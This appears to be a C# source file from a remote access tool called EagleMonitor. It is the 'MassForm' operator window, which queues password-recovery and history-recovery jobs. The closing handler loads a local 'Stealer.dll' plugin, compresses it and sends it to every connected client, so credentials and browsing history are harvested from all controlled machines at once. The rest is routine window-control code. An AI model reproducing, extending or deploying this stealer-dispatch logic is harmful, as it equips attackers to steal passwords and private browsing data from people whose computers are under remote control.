using EagleMonitor.Controls;
using EagleMonitor.Networking;
using PacketLib;
using PacketLib.Packet;
using System;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.Forms
{
    public partial class MassForm : FormPattern
    {
        public MassForm()
        {
            InitializeComponent();
        }

        private void MassForm_Load(object sender, EventArgs e)
        {
            packetGuna2ComboBox.Items.Add(PacketType.RECOVERY_PASSWORDS);
            packetGuna2ComboBox.Items.Add(PacketType.RECOVERY_HISTORY);
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            this.Hide();
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void addPacketGuna2Button_Click(object sender, EventArgs e)
        {
            Program.logForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
            {
                int rowId = dataGridView1.Rows.Add();
                DataGridViewRow row = dataGridView1.Rows[rowId];

                switch (packetGuna2ComboBox.Text)
                {
                    case "RECOVERY_PASSWORDS":
                        row.Cells["Column1"].Value = ((byte)PacketType.RECOVERY_PASSWORDS);
                        row.Cells["Column2"].Value = "RECOVERY_PASSWORDS";                   
                        break;

                    case "RECOVERY_HISTORY":
                        row.Cells["Column1"].Value = ((byte)PacketType.RECOVERY_HISTORY);
                        row.Cells["Column2"].Value = "RECOVERY_HISTORY";
                        break;
                }

            }));

        }
        private void dataGridView1_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                DataGridView.HitTestInfo hit = dataGridView1.HitTest(e.X, e.Y);
                if (hit.Type == DataGridViewHitTestType.None)
                {
                    dataGridView1.ClearSelection();
                    dataGridView1.CurrentCell = null;
                }
            }
        }

        private void closeStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string packetNum = dataGridViewRow.Cells[0].Value.ToString();

                switch (packetNum) 
                {
                    case "3":
                        foreach (KeyValuePair<string, ClientHandler> client in ClientHandler.ClientHandlersList) 
                        {
                            PasswordsPacket passwordsPacket = new PasswordsPacket
                            {
                                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Stealer.dll"), 1)
                            };
                            client.Value.SendPacket(passwordsPacket);
                        }
                        break;

                    case "4":
                        foreach (KeyValuePair<string, ClientHandler> client in ClientHandler.ClientHandlersList)
                        {
                            HistoryPacket historyPacket = new HistoryPacket
                            {
                                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Stealer.dll"), 1)
                            };
                            client.Value.SendPacket(historyPacket);
                        }
                        break;

                }
            }
        }
    }
}
